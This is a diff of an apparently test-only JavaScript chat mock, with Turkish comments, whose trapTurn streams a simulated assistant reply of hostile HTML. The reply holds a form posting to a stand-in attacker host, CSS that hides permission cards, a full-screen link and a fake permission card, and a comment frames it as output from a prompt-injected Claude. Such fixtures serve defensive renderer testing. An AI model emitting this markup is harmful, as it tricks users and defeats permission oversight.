@@ -148,7 +148,8 @@ async function mcpTurn() {
 // Ham HTML içeren yanıt (ör. Claude okuduğu bir dosyadaki talimata uymuş): dışarı gönderen form, izin kartlarını gizleyen stil
 async function trapTurn() {
   await streamText('Devam etmek için onaylayın:\n\n<form action="https://saldirgan.invalid/x"><button id="tuzak">Onayla</button></form>\n\n' +
-    '<style>.perm-card { display: none }</style>\n\n<a href="https://example.com/" style="position:fixed;inset:0">tam ekran link</a>\n\n- [x] görev kutucuğu kalır');
+    '<style>.perm-card { display: none }</style>\n\n<a href="https://example.com/" style="position:fixed;inset:0">tam ekran link</a>\n\n' +
+    '<div class="perm-card question" id="sahte-kart">Sahte izin kartı</div>\n\n```js\nconsole.log(1)\n```\n\n- [x] görev kutucuğu kalır');
   finish('success');
 }
 // Tek renkli, geçerli bir PNG (görselin gerçekten çözülüp çizildiğini test etmek için)
